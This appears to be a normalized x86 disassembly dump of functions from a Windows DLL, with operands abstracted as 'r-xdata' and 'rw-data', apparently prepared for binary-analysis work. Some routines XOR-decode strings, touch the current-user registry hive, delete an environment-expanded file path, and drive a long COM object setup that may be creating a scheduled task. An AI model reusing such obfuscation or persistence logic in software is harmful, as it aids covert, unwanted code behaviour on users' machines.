add esp 0xc
xor esi esi
xor eax eax
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x55
and edx 0xff
mov [ ebp + eax * 2 - 0xa4 ] dx
inc eax
cmp eax 0x3d
jb r-xdata
lea ecx [ ebp - 0xa4 ]
push ecx
xor eax eax
push 0x80000001
mov [ ebp - 0x2a ] ax
call sub_10044c30
add esp 0x8
test eax eax
je r-xdata
mov ecx [ r--data ]
xor eax eax
lea esp [ esp ]
mov esi 0x1
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffa3
and edx 0xff
mov [ ebp + eax * 2 - 0x28 ] dx
inc eax
cmp eax 0x10
jb r-xdata
push 0x104
lea ecx [ ebp - 0x2ac ]
push ecx
lea edx [ ebp - 0x28 ]
xor eax eax
push edx
mov [ ebp - 0x8 ] ax
call [ ExpandEnvironmentStringsW@IAT ]
lea eax [ ebp - 0x2ac ]
push eax
call [ DeleteFileW@IAT ]
test eax eax
mov eax 0x2
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov eax esi
sub_100672a0
mov edi edi
push ebp
mov ebp esp
sub esp 0x90
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x90 ] eax
mov eax [ esi + 0x1c ]
push edi
mov [ ebp - 0x8c ] ecx
mov ecx [ esi + 0x18 ]
mov edi 0x2000
test eax eax
jg r-xdata
mov ebx ecx
mov [ ebp - 0x8 ] eax
test eax eax
jl r-xdata
jl r-xdata
mov [ ebp - 0x88 ] ebx
push 0x24
pop eax
jg r-xdata
test [ esi + 0x14 ] edi
jne r-xdata
test ecx ecx
jne r-xdata
fld [ ebp + 0x1c ]
fldz
fld [ ebp + 0x1c ]
fcom st1
fnstsw ax
test ah 0x5
jpe r-xdata
mov [ ebp - 0x88 ] eax
jmp r-xdata
cmp ebx eax
jbe r-xdata
push 0x6
pop ecx
xor eax eax
mov [ ebp - 0x79 ] 0x0
jmp r-xdata
mov [ ebp - 0x79 ] 0x1
fchs
mov eax [ ebp - 0x88 ]
mov ecx [ esi + 0x14 ]
cdq
sub ebx eax
sbb [ ebp - 0x8 ] edx
and [ ebp - 0x80 ] 0x0
and [ ebp - 0x84 ] 0x0
mov eax ecx
and eax 0x3000
cmp eax edi
jne r-xdata
fld [ r--data ]
push 0xa
fcom st1
mov edx 0x1388
pop edi
fnstsw ax
fld [ r--data ]
test ah 0x41
jpo r-xdata
cmp [ ebp - 0x80 ] edx
jae r-xdata
fstp st1
jmp r-xdata
fdiv st2
add [ ebp - 0x80 ] edi
fxch st1
fcom st2
fnstsw ax
test ah 0x41
jpo r-xdata
fxch st2
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fxch st1
fstp st0
cmp [ ebp - 0x79 ] 0x0
fstp st1
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jl r-xdata
push ecx
push ecx
fstp [ esp ]
push [ ebp - 0x88 ]
lea eax [ ebp - 0xc ]
push ecx
push 0x4c
push eax
push [ ebp - 0x8c ]
call sub_10017366
add esp 0x10
push eax
lea eax [ ebp - 0x78 ]
push 0x6c
push eax
call sub_1002868d
push eax
push ebx
push [ ebp - 0x84 ]
lea eax [ ebp - 0x78 ]
push [ ebp - 0x80 ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp - 0x90 ]
push [ ebp - 0x8c ]
call sub_10025acc
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x90 ]
add esp 0x44
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
leave
retn 0x1c
fchs
jmp r-xdata
jg r-xdata
fld [ r--data ]
fcomp st1
fnstsw ax
test ah 0x1
jne r-xdata
cmp ebx edi
jb r-xdata
cmp [ ebp - 0x84 ] edx
jae r-xdata
add ebx 0xfffffff6
fmul st1
adc [ ebp - 0x8 ] 0xffffffff
add [ ebp - 0x84 ] edi
cmp [ ebp - 0x8 ] 0x0
jg r-xdata
jge r-xdata
sub_10067466
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_10042d7c
pop ecx
cmp eax 0xffffffff
jne r-xdata
push edi
push [ ebp + 0x10 ]
push 0x0
push [ ebp + 0xc ]
push eax
call [ SetFilePointer@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
call sub_10012991
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
pop esi
pop ebp
retn
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax edi
push eax
call sub_100249b4
pop ecx
or eax 0xffffffff
jmp r-xdata
test eax eax
je r-xdata
pop edi
sub_100674e0
push ebp
mov ebp esp
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
mov esi [ eax + 0x12c ]
test esi esi
jne r-xdata
push edi
lea edi [ eax + 0x130 ]
lea edx [ ebp - 0x34 ]
mov eax 0xda
call sub_1000a6f0
xor eax eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
push edi
push esi
call sub_10025520
mov esi [ esi + 0x4 ]
add esp 0x8
test esi esi
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
xor eax eax
pop esi
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
sub_10067560
mov edi edi
push esi
mov esi ecx
mov eax [ esi + 0x8 ]
mov [ esi ] r--data
test eax eax
je r-xdata
mov esi [ esi + 0xc ]
test esi esi
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
pop esi
retn
push esi
call [ LocalFree@IAT ]
sub_10067590
push ebp
mov ebp esp
push 0xffffffff
push sub_10080c39
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x10 ] edi
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] edi
mov [ esi ] ax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x10 ] 0x1
lea edx [ eax + 0x2 ]
lea esp [ esp ]
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
mov edi [ esi + 0x10 ]
sub eax edx
sar eax 0x1
add eax [ ebx + 0x10 ]
cmp edi eax
ja r-xdata
mov edi [ ebp + 0xc ]
mov eax edi
lea edx [ eax + 0x2 ]
lea esp [ esp ]
cmp [ esi + 0x14 ] eax
je r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push edi
mov ecx esi
call sub_10023990
push 0xffffffff
push 0x0
push ebx
mov ecx esi
call sub_1000c1e0
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
push 0x1
push eax
mov ecx esi
call sub_10050a00
test al al
je r-xdata
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
xor ecx ecx
mov [ eax + edi * 2 ] cx
sub_10067688
push 0x3c
mov eax sub_1007e369
call sub_10007703
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov ebx [ ebp + 0x20 ]
mov edi [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10009450
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_10010e0d
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10036d11
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
mov [ ebp - 0x44 ] edx
call sub_1002a730
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10060ea7
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ ebx ] 0x1
or [ ebx ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x44 ]
mov [ edi ] esi
mov [ edi + 0x4 ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_10019c00
retn 0x20
sub_1006773f
push 0x10
mov eax sub_1007e5e8
call sub_10050d0f
mov edi ecx
mov ecx [ ebp + 0x1c ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10009450
and [ ebp - 0x4 ] 0x0
push eax
call sub_1004c670
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
call sub_1002a730
mov esi [ ebp + 0x28 ]
mov ebx [ ebp + 0x20 ]
jmp r-xdata
mov al [ esi ]
test al al
jne r-xdata
cmp al 0x25
jne r-xdata
jmp r-xdata
cmp al 0x20
je r-xdata
push 0x0
mov eax [ edi ]
inc esi
movzx ecx [ esi ]
push ecx
push [ ebp + 0x24 ]
lea ecx [ ebp - 0x1c ]
push ebx
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx edi
call [ eax + 0x1c ]
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
jmp r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100161f2
test al al
je r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100161f2
test al al
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
inc esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1001a1b3
retn 0x24
or [ ebx ] 0x1
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
jmp r-xdata
mov al [ ebp + 0x11 ]
cmp al [ esi ]
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1004cd62
movzx eax [ ebp + 0x11 ]
mov ecx [ ebp - 0x14 ]
mov ecx [ ecx + 0x10 ]
test [ ecx + eax * 2 ] 0x48
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_1004cd62
or [ ebx ] 0x2
lea ecx [ ebp + 0xc ]
call sub_10017b01
lea ecx [ ebp + 0xc ]
call sub_10017b01
sub_10067840
push ebp
mov ebp esp
xor eax eax
test ecx ecx
je r-xdata
mov eax 0x80070057
cmp ecx 0x7fffffff
jbe r-xdata
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
push eax
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov edx 0x7ffffffe
call sub_1006b860
test eax eax
js r-xdata
sub_10067871
push 0x14
mov eax sub_1007e60b
call sub_10050d0f
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100067d1
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007a60
mov ecx [ ebp + 0x8 ]
push eax
call sub_100033a0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1002470e
mov eax edi
call sub_1001a1b3
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1000a284
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_1001c4b0
push edi
call sub_10009b69
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_10036aac
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002050e
sub_10067910
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push esi
push eax
push ecx
push edx
call sub_1003cf14
mov esi eax
add esp 0xc
cmp esi 0xffffffff
jne r-xdata
pop esi
pop ebp
retn 0x10
call sub_10012991
mov eax [ eax ]
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
mov eax esi
sub_10067950
push ebp
mov ebp esp
push 0xffffffff
push sub_100800bb
mov eax [ fs : 0x0 ]
push eax
sub esp 0x170
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
push ebx
push ebx
mov esi ecx
mov [ ebp - 0xd4 ] eax
call [ CoInitializeEx@IAT ]
test eax eax
js r-xdata
mov eax 0x1
jmp r-xdata
push ebx
push ebx
push ebx
push 0x3
push 0x6
push ebx
push ebx
push 0xffffffff
push ebx
call [ CoInitializeSecurity@IAT ]
cmp eax ebx
jge r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
xor ecx ecx
mov eax esi
mov [ ebp - 0xa4 ] 0x7
mov [ ebp - 0xa8 ] ebx
mov [ ebp - 0xb8 ] cx
lea edx [ eax + 0x2 ]
cmp eax 0x80010119
je r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push esi
lea ecx [ ebp - 0xb8 ]
call sub_1005e3c0
lea edx [ ebp - 0xcc ]
push edx
push r--data
push 0x1
push ebx
mov [ ebp - 0x4 ] ebx
push r--data
mov [ ebp - 0xcc ] ebx
call [ CoCreateInstance@IAT ]
cmp eax ebx
jge r-xdata
call [ CoUninitialize@IAT ]
mov esi [ VariantInit@IAT ]
lea ecx [ ebp - 0x144 ]
push ecx
call esi
mov edx [ ebp - 0x140 ]
mov eax [ ebp - 0x13c ]
mov ecx [ ebp - 0x138 ]
mov edi [ ebp - 0x144 ]
mov [ ebp - 0x128 ] edx
lea edx [ ebp - 0x154 ]
push edx
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x120 ] ecx
call esi
mov ecx [ ebp - 0x150 ]
mov eax [ ebp - 0x154 ]
mov edx [ ebp - 0x14c ]
mov [ ebp - 0x108 ] ecx
mov [ ebp - 0x10c ] eax
mov eax [ ebp - 0x148 ]
lea ecx [ ebp - 0x164 ]
push ecx
mov [ ebp - 0x104 ] edx
mov [ ebp - 0x100 ] eax
call esi
mov eax [ ebp - 0x160 ]
mov edx [ ebp - 0x164 ]
mov ecx [ ebp - 0x15c ]
mov [ ebp - 0xf0 ] eax
mov [ ebp - 0xf4 ] edx
mov edx [ ebp - 0x158 ]
lea eax [ ebp - 0x17c ]
push eax
mov [ ebp - 0xec ] ecx
mov [ ebp - 0xe8 ] edx
call esi
mov [ ebp - 0x4 ] 0x4
mov esi [ ebp - 0x128 ]
sub esp 0x10
mov eax esp
mov [ eax ] edi
mov [ eax + 0x4 ] esi
mov esi [ ebp - 0x124 ]
mov [ eax + 0x8 ] esi
mov esi [ ebp - 0x120 ]
mov [ eax + 0xc ] esi
mov esi [ ebp - 0x10c ]
sub esp 0x10
mov eax esp
mov [ eax ] esi
mov esi [ ebp - 0x108 ]
mov [ eax + 0x4 ] esi
mov esi [ ebp - 0x104 ]
mov [ eax + 0x8 ] esi
mov esi [ ebp - 0x100 ]
mov [ eax + 0xc ] esi
mov esi [ ebp - 0xf4 ]
mov ecx [ ebp - 0xcc ]
mov edx [ ecx ]
sub esp 0x10
mov eax esp
mov [ eax ] esi
mov esi [ ebp - 0xf0 ]
mov [ eax + 0x4 ] esi
mov esi [ ebp - 0xec ]
mov [ eax + 0x8 ] esi
mov esi [ ebp - 0xe8 ]
mov [ eax + 0xc ] esi
mov esi [ ebp - 0x17c ]
sub esp 0x10
mov eax esp
mov [ eax ] esi
mov esi [ ebp - 0x178 ]
mov [ eax + 0x4 ] esi
mov esi [ ebp - 0x174 ]
mov [ eax + 0x8 ] esi
mov esi [ ebp - 0x170 ]
mov [ eax + 0xc ] esi
mov eax [ edx + 0x28 ]
push ecx
call eax
mov esi [ VariantClear@IAT ]
lea ecx [ ebp - 0x17c ]
push ecx
mov edi eax
call esi
lea edx [ ebp - 0x164 ]
push edx
call esi
lea eax [ ebp - 0x154 ]
push eax
call esi
lea ecx [ ebp - 0x144 ]
push ecx
mov [ ebp - 0x4 ] bl
call esi
cmp edi ebx
jge r-xdata
call [ CoUninitialize@IAT ]
cmp [ ebp - 0xa4 ] 0x8
jb r-xdata
lea edx [ ebp - 0x168 ]
mov eax 0x1
mov [ ebp - 0xc0 ] ebx
call sub_1005bf90
lea edx [ ebp - 0xc4 ]
push edx
lea edi [ ebp - 0x168 ]
call sub_100285a0
mov [ ebp - 0x4 ] 0x5
mov eax [ eax ]
cmp eax ebx
je r-xdata
mov eax [ ebp - 0xcc ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
call [ CoUninitialize@IAT ]
cmp [ ebp - 0xa4 ] 0x8
jb r-xdata
mov eax 0x1
jmp r-xdata
mov eax [ ebp - 0xb8 ]
push eax
call sub_10065045
add esp 0x4
xor eax eax
mov eax [ eax ]
jmp r-xdata
mov ecx [ ebp - 0xb8 ]
push ecx
call sub_10065045
add esp 0x4
mov eax 0x1
jmp r-xdata
lea eax [ ebp - 0xc4 ]
push eax
mov edi r--data
call sub_100285a0
mov [ ebp - 0x4 ] 0x6
mov eax [ eax ]
cmp eax ebx
je r-xdata
mov eax [ ebp - 0xcc ]
mov ecx [ ebp - 0xcc ]
mov edx [ ecx ]
lea edi [ ebp - 0xc0 ]
push edi
push eax
mov eax [ edx + 0x1c ]
push ecx
call eax
lea edi [ ebp - 0xc4 ]
mov [ ebp - 0xc8 ] eax
mov [ ebp - 0x4 ] bl
call sub_10005b80
cmp [ ebp - 0xc8 ] ebx
jge r-xdata
xor ecx ecx
mov ecx [ eax ]
jmp r-xdata
mov eax [ ebp - 0xbc ]
lea edx [ ebp - 0xf8 ]
mov [ ebp - 0xf8 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x1c ]
call eax
test eax eax
js r-xdata
mov eax [ ebp - 0xc0 ]
jmp r-xdata
mov eax [ ebp - 0xc0 ]
mov edx [ eax ]
push ebx
push ecx
push eax
mov eax [ edx + 0x3c ]
call eax
lea edi [ ebp - 0xc4 ]
mov [ ebp - 0x4 ] bl
call sub_10005b80
mov eax [ ebp - 0xcc ]
lea edx [ ebp - 0xbc ]
push edx
mov [ ebp - 0xbc ] ebx
mov ecx [ eax ]
push ebx
push eax
mov eax [ ecx + 0x24 ]
call eax
mov edi eax
mov eax [ ebp - 0xcc ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp edi ebx
jge r-xdata
mov eax [ ebp - 0xc0 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0xbc ]
jmp r-xdata
mov eax [ ebp - 0xf8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x28 ]
push r--data
push eax
call edx
mov edi eax
mov eax [ ebp - 0xf8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp edi ebx
jl r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
call [ CoUninitialize@IAT ]
lea ecx [ ebp - 0xb8 ]
call sub_10035d10
mov eax 0x1
jmp r-xdata
mov eax [ ebp - 0xbc ]
lea edx [ ebp - 0xd8 ]
mov [ ebp - 0xd8 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x3c ]
call eax
cmp eax ebx
jl r-xdata
lea edx [ ebp - 0x4c ]
mov eax 0x7
call sub_1005bf90
lea eax [ ebp - 0xc4 ]
push eax
mov edi edx
call sub_100285a0
mov [ ebp - 0x4 ] 0x7
mov eax [ eax ]
cmp eax ebx
je r-xdata
xor ecx ecx
mov ecx [ eax ]
jmp r-xdata
mov eax [ ebp - 0xbc ]
lea edx [ ebp - 0x110 ]
mov [ ebp - 0x110 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x2c ]
call eax
test eax eax
js r-xdata
mov eax [ ebp - 0xd8 ]
mov edx [ eax ]
push ecx
push eax
mov eax [ edx + 0x20 ]
call eax
lea edi [ ebp - 0xc4 ]
mov [ ebp - 0x4 ] bl
call sub_10005b80
mov eax [ ebp - 0xd8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x38 ]
push 0x2
push eax
call edx
mov eax [ ebp - 0xd8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x48 ]
push 0x1
push eax
call edx
mov edi eax
mov eax [ ebp - 0xd8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp edi ebx
jl r-xdata
mov eax [ ebp - 0x110 ]
mov ecx [ eax ]
mov edx [ ecx + 0x58 ]
push 0xffffffff
push eax
call edx
mov edi eax
mov eax [ ebp - 0x110 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp edi ebx
jl r-xdata
mov eax [ ebp - 0xbc ]
lea edx [ ebp - 0x118 ]
mov [ ebp - 0x118 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x24 ]
call eax
test eax eax
js r-xdata
mov eax [ ebp - 0x118 ]
lea edx [ ebp - 0x114 ]
push edx
mov [ ebp - 0x114 ] ebx
mov ecx [ eax ]
push 0x9
push eax
mov eax [ ecx + 0x28 ]
call eax
mov edi eax
mov eax [ ebp - 0x118 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp edi ebx
jl r-xdata
mov eax [ ebp - 0x114 ]
lea edx [ ebp - 0xd0 ]
push edx
mov [ ebp - 0xd0 ] ebx
mov ecx [ eax ]
push r--data
push eax
mov eax [ ecx ]
call eax
mov edi eax
mov eax [ ebp - 0x114 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp edi ebx
jl r-xdata
lea edx [ ebp - 0x34 ]
mov eax 0x8
call sub_1005bf90
lea eax [ ebp - 0xc4 ]
push eax
mov edi edx
call sub_100285a0
mov [ ebp - 0x4 ] 0x8
mov eax [ eax ]
cmp eax ebx
je r-xdata
xor ecx ecx
mov ecx [ eax ]
jmp r-xdata
xor eax eax
mov eax [ eax ]
jmp r-xdata
mov eax [ ebp - 0xd0 ]
mov edx [ eax ]
push ecx
push eax
mov eax [ edx + 0x24 ]
call eax
lea edi [ ebp - 0xc4 ]
mov [ ebp - 0x4 ] bl
call sub_10005b80
lea edx [ ebp - 0x74 ]
xor eax eax
call sub_1005bf90
lea ecx [ ebp - 0xc4 ]
push ecx
mov edi edx
call sub_100285a0
mov [ ebp - 0x4 ] 0x9
mov eax [ eax ]
cmp eax ebx
je r-xdata
xor ecx ecx
mov ecx [ eax ]
jmp r-xdata
mov ecx [ ebp - 0xd0 ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x3c ]
push ecx
call eax
lea edi [ ebp - 0xc4 ]
mov [ ebp - 0x4 ] bl
call sub_10005b80
lea edx [ ebp - 0x9c ]
mov eax 0x3
call sub_1005bf90
lea ecx [ ebp - 0xc4 ]
push ecx
mov edi edx
call sub_100285a0
mov [ ebp - 0x4 ] 0xa
mov eax [ eax ]
cmp eax ebx
je r-xdata
mov eax [ ebp - 0xbc ]
lea edx [ ebp - 0xe0 ]
mov [ ebp - 0xe0 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x44 ]
call eax
test eax eax
js r-xdata
mov eax [ ebp - 0xd0 ]
mov edx [ eax ]
push ecx
push eax
mov eax [ edx + 0x44 ]
call eax
lea edi [ ebp - 0xc4 ]
mov [ ebp - 0x4 ] bl
call sub_10005b80
lea edx [ ebp - 0x20 ]
mov eax 0x4
call sub_1005bf90
mov eax [ ebp - 0xd0 ]
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x54 ]
call eax
mov edi eax
mov eax [ ebp - 0xd0 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp edi ebx
jl r-xdata
mov eax [ ebp - 0xe0 ]
lea edx [ ebp - 0xfc ]
push edx
mov [ ebp - 0xfc ] ebx
mov ecx [ eax ]
push ebx
push eax
mov eax [ ecx + 0x30 ]
call eax
mov edi eax
mov eax [ ebp - 0xe0 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp edi ebx
jl r-xdata
mov eax [ ebp - 0xfc ]
lea edx [ ebp - 0xdc ]
push edx
mov [ ebp - 0xdc ] ebx
mov ecx [ eax ]
push r--data
push eax
mov eax [ ecx ]
call eax
mov edi eax
mov eax [ ebp - 0xfc ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp edi ebx
jl r-xdata
cmp [ ebp - 0xa4 ] 0x8
mov edi [ ebp - 0xb8 ]
jae r-xdata
lea eax [ ebp - 0xc4 ]
push eax
call sub_100285a0
mov [ ebp - 0x4 ] 0xb
mov eax [ eax ]
cmp eax ebx
je r-xdata
lea edi [ ebp - 0xb8 ]
xor eax eax
mov eax [ eax ]
jmp r-xdata
mov edi [ ebp - 0xd4 ]
lea eax [ ebp - 0xd4 ]
push eax
call sub_100285a0
mov [ ebp - 0x4 ] 0xc
mov eax [ eax ]
cmp eax ebx
je r-xdata
mov eax [ ebp - 0xdc ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0xdc ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x2c ]
push ecx
call eax
lea edi [ ebp - 0xc4 ]
mov [ ebp - 0xc8 ] eax
mov [ ebp - 0x4 ] bl
call sub_10005b80
cmp [ ebp - 0xc8 ] ebx
jge r-xdata
xor ecx ecx
mov ecx [ eax ]
jmp r-xdata
mov eax 0x8
push r--data
mov [ ebp - 0x130 ] ebx
mov [ ebp - 0x164 ] ax
call [ SysAllocString@IAT ]
mov [ ebp - 0x15c ] eax
cmp eax ebx
jne r-xdata
mov eax [ ebp - 0xdc ]
mov edx [ eax ]
push ecx
push eax
mov eax [ edx + 0x34 ]
call eax
lea edi [ ebp - 0xd4 ]
mov [ ebp - 0xc8 ] eax
mov [ ebp - 0x4 ] bl
call sub_10005b80
mov eax [ ebp - 0xdc ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp [ ebp - 0xc8 ] ebx
jl r-xdata
mov ecx [ ebp - 0x164 ]
mov edx [ ebp - 0x160 ]
mov edi [ VariantInit@IAT ]
mov [ ebp - 0xf4 ] ecx
mov [ ebp - 0xec ] eax
mov eax [ ebp - 0x158 ]
lea ecx [ ebp - 0x154 ]
push ecx
mov [ ebp - 0xf0 ] edx
mov [ ebp - 0xe8 ] eax
call edi
mov eax [ ebp - 0x150 ]
mov edx [ ebp - 0x154 ]
mov ecx [ ebp - 0x14c ]
mov [ ebp - 0x108 ] eax
mov [ ebp - 0x10c ] edx
mov edx [ ebp - 0x148 ]
lea eax [ ebp - 0x144 ]
push eax
mov [ ebp - 0x104 ] ecx
mov [ ebp - 0x100 ] edx
call edi
mov [ ebp - 0x4 ] 0xf
mov edx [ ebp - 0x140 ]
mov ecx [ ebp - 0x144 ]
mov eax [ ebp - 0x13c ]
mov [ ebp - 0x128 ] edx
mov [ ebp - 0x12c ] ecx
mov ecx [ ebp - 0x138 ]
lea edx [ ebp - 0xd4 ]
push edx
mov edi r--data
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x120 ] ecx
call sub_100285a0
mov [ ebp - 0x4 ] 0x10
mov eax [ eax ]
cmp eax ebx
je r-xdata
push 0x8007000e
call sub_1004dba0
mov [ ebp - 0xc8 ] ebx
mov eax [ eax ]
mov [ ebp - 0xc8 ] eax
jmp r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
call edx
mov eax [ ebp - 0xbc ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0x130 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
call [ CoUninitialize@IAT ]
lea ecx [ ebp - 0xb8 ]
call sub_10035d10
xor eax eax
mov edx [ eax ]
mov eax [ edx + 0x8 ]
call eax
mov eax [ ebp - 0xbc ]
jmp r-xdata
mov edi [ ebp - 0xf4 ]
lea eax [ ebp - 0x130 ]
push eax
sub esp 0x10
mov eax esp
mov [ eax ] edi
mov edi [ ebp - 0xf0 ]
